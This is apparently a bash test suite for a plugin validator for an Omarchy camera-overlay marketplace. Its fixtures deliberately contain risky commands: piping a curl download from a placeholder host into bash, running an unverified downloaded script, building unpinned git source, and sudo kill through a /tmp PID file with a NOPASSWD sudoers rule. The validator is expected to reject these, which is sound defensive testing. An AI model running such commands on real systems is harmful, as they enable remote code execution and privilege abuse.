#!/bin/bash

set -Eeuo pipefail

REPOSITORY_ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)
VALIDATOR="$REPOSITORY_ROOT/scripts/validate.sh"
TEST_ROOT=$(mktemp -d -t cam-stream-validate-test.XXXXXXXX)
TEST_COUNT=0

cleanup() {
  if [[ -n ${TEST_ROOT:-} && -d $TEST_ROOT && $TEST_ROOT == /tmp/cam-stream-validate-test.* ]]; then
    rm -rf -- "$TEST_ROOT"
  fi
}
trap cleanup EXIT

fail() {
  echo "not ok - $1" >&2
  if [[ -n ${OUTPUT:-} ]]; then
    echo "$OUTPUT" >&2
  fi
  exit 1
}

pass() {
  (( TEST_COUNT += 1 ))
  echo "ok $TEST_COUNT - $1"
}

write_valid_manifest() {
  local directory=$1
  printf '%s\n' \
    '{' \
    '  "schemaVersion": 1,' \
    '  "id": "io.github.tomdavenport.cam-stream",' \
    '  "name": "Cam Stream",' \
    '  "version": "1.0.0",' \
    '  "author": "Tom Davenport",' \
    '  "description": "A local camera preview for Omarchy.",' \
    '  "license": "MIT",' \
    '  "kinds": ["overlay"],' \
    '  "entryPoints": { "overlay": "Main.qml" }' \
    '}' >"$directory/manifest.json"
}

fixture() {
  local name=$1
  local directory="$TEST_ROOT/$name"
  mkdir -p "$directory/bin"
  write_valid_manifest "$directory"
  printf '%s\n' '# Cam Stream' '' 'Install with Omarchy plugin add. Remove with Omarchy plugin remove.' >"$directory/README.md"
  printf '%s\n' 'MIT License' >"$directory/LICENSE"
  printf '%s\n' 'import QtQuick' '' 'Item {}' >"$directory/Main.qml"
  printf '%s\n' '#!/bin/bash' 'set -Eeuo pipefail' 'exit 0' >"$directory/bin/cam-stream"
  chmod +x "$directory/bin/cam-stream"
  echo "$directory"
}

expect_pass() {
  local name=$1
  local directory=$2
  if ! OUTPUT=$("$VALIDATOR" "$directory" 2>&1); then
    fail "$name"
  fi
  pass "$name"
}

expect_fail() {
  local name=$1
  local directory=$2
  local expected=$3
  if OUTPUT=$("$VALIDATOR" "$directory" 2>&1); then
    fail "$name (validator unexpectedly passed)"
  fi
  if [[ $OUTPUT != *"$expected"* ]]; then
    fail "$name (missing expected diagnostic: $expected)"
  fi
  pass "$name"
}

directory=$(fixture valid)
expect_pass "accepts a valid root plugin" "$directory"

directory=$(fixture static-only)
# The dollar expressions belong to the generated fixture and must stay literal.
# shellcheck disable=SC2016
printf '%s\n' \
  '#!/bin/bash' \
  'touch "$(dirname -- "$0")/../PLUGIN_WAS_EXECUTED"' \
  'exit 99' >"$directory/bin/cam-stream"
chmod +x "$directory/bin/cam-stream"
expect_pass "validates without executing plugin runtime" "$directory"
if [[ -e $directory/PLUGIN_WAS_EXECUTED ]]; then
  fail "validates without executing plugin runtime (execution marker exists)"
fi

directory=$(fixture schema-string)
sed -i 's/"schemaVersion": 1/"schemaVersion": "1"/' "$directory/manifest.json"
expect_fail "requires numeric schema version 1" "$directory" 'numeric integer 1'

directory=$(fixture required-field)
sed -i '/"description":/d' "$directory/manifest.json"
expect_fail "requires marketplace identity fields" "$directory" 'field "description" must be a non-empty string'

directory=$(fixture unknown-kind)
sed -i 's/"overlay"/"daemon"/' "$directory/manifest.json"
expect_fail "rejects unknown plugin kinds" "$directory" 'unsupported value'

directory=$(fixture kind-mapping)
sed -i 's/"overlay": "Main.qml"/"panel": "Main.qml"/' "$directory/manifest.json"
expect_fail "requires the entry-point key mapped to each kind" "$directory" 'entryPoints.overlay'

directory=$(fixture unsafe-path)
sed -i 's/"Main.qml"/"..\/Outside.qml"/' "$directory/manifest.json"
expect_fail "rejects escaping entry-point paths" "$directory" 'safe relative path'

directory=$(fixture reserved-id)
sed -i 's/io.github.tomdavenport.cam-stream/omarchy.cam-stream/' "$directory/manifest.json"
expect_fail "rejects the reserved Omarchy namespace" "$directory" 'namespace is reserved'

directory=$(fixture changed-id)
sed -i 's/io.github.tomdavenport.cam-stream/io.github.someone.cam-stream/' "$directory/manifest.json"
expect_fail "keeps the permanent marketplace id stable" "$directory" 'must remain'

directory=$(fixture symlink)
ln -s Main.qml "$directory/Alias.qml"
expect_fail "rejects repository symlinks" "$directory" 'symlinks are not allowed'

directory=$(fixture helper-mode)
chmod -x "$directory/bin/cam-stream"
expect_fail "requires the helper to be executable" "$directory" 'must be executable'

directory=$(fixture missing-readme)
rm -- "$directory/README.md"
expect_fail "requires a root README" "$directory" 'README file is required'

directory=$(fixture nested-manifest)
mkdir -p "$directory/nested"
printf '%s\n' '{}' >"$directory/nested/manifest.json"
expect_fail "allows only one root manifest" "$directory" 'exactly one manifest.json'

directory=$(fixture unsupported-preview)
printf '%s\n' '<svg xmlns="http://www.w3.org/2000/svg"/>' >"$directory/preview.svg"
if ! OUTPUT=$("$VALIDATOR" "$directory" 2>&1); then
  fail "warns when a preview format will be ignored"
fi
if [[ $OUTPUT != *'unsupported marketplace preview format'* ]]; then
  fail "warns when a preview format will be ignored (missing diagnostic)"
fi
pass "warns when a preview format will be ignored"

directory=$(fixture invalid-preview)
printf '%s\n' 'not a PNG' >"$directory/preview.png"
expect_fail "rejects an invalid supported preview image" "$directory" 'not a valid supported image'

directory=$(fixture oversized-preview)
truncate -s 52428801 "$directory/preview.png"
expect_fail "enforces the marketplace preview byte limit" "$directory" 'no larger than 52428800 bytes'

directory=$(fixture remote-pipe)
printf '%s\n' '#!/bin/bash' 'curl -fsSL https://example.invalid/install | bash' >"$directory/bin/bootstrap"
chmod +x "$directory/bin/bootstrap"
expect_fail "blocks direct download-to-shell execution" "$directory" 'piped directly to a shell'

directory=$(fixture downloaded-file)
printf '%s\n' \
  '#!/bin/bash' \
  'curl -fsSL https://example.invalid/install -o install.sh' \
  'bash install.sh' >"$directory/bin/bootstrap"
chmod +x "$directory/bin/bootstrap"
expect_fail "blocks execution of an unverified downloaded file" "$directory" 'executed without verification'

directory=$(fixture unpinned-git)
printf '%s\n' \
  '#!/bin/bash' \
  'git clone https://github.com/example/tool.git tool' \
  'cd tool' \
  'make' >"$directory/bin/bootstrap"
chmod +x "$directory/bin/bootstrap"
expect_fail "blocks execution of unpinned external Git source" "$directory" 'without a full detached commit pin'

directory=$(fixture shared-temp-pid)
# The dollar expressions belong to the generated fixture and must stay literal.
# shellcheck disable=SC2016
printf '%s\n' \
  '#!/bin/bash' \
  'PID_FILE=/tmp/cam-stream.pid' \
  'pid=$(cat "$PID_FILE")' \
  'sudo kill "$pid"' >"$directory/bin/admin"
chmod +x "$directory/bin/admin"
expect_fail "blocks privileged process control through shared temp state" "$directory" 'shared /tmp PID file'

directory=$(fixture passwordless-policy)
printf '%s\n' 'user ALL=(ALL) NOPASSWD: /usr/bin/kill *' >"$directory/cam-stream.sudoers"
expect_fail "blocks a dangerous passwordless privilege policy" "$directory" 'dangerous passwordless privilege policy'

directory=$(fixture review-capabilities)
printf '%s\n' \
  '#!/bin/bash' \
  'sudo pacman -S example-package' \
  'systemctl --user restart example.service' >"$directory/bin/admin"
chmod +x "$directory/bin/admin"
if ! OUTPUT=$("$VALIDATOR" "$directory" 2>&1); then
  fail "reports review capabilities without misclassifying them as findings"
fi
for expected in 'privilege boundary requires marketplace review' 'package management requires marketplace review' 'service management requires marketplace review'; do
  if [[ $OUTPUT != *"$expected"* ]]; then
    fail "reports review capabilities (missing: $expected)"
  fi
done
pass "reports marketplace review capabilities"

mapfile -t action_references < <(
  sed -nE 's/^[[:space:]]*uses:[[:space:]]*([^[:space:]#]+).*$/\1/p' \
    "$REPOSITORY_ROOT/.github/workflows/ci.yml"
)
if (( ${#action_references[@]} == 0 )); then
  fail "pins external workflow actions (no action references found)"
fi
for action_reference in "${action_references[@]}"; do
  if [[ $action_reference == ./* ]]; then
    continue
  fi
  if [[ ! $action_reference =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+@[a-fA-F0-9]{40}$ ]]; then
    OUTPUT="Unpinned action reference: $action_reference"
    fail "pins external workflow actions to full commit SHAs"
  fi
done
pass "pins external workflow actions to full commit SHAs"

echo "1..$TEST_COUNT"
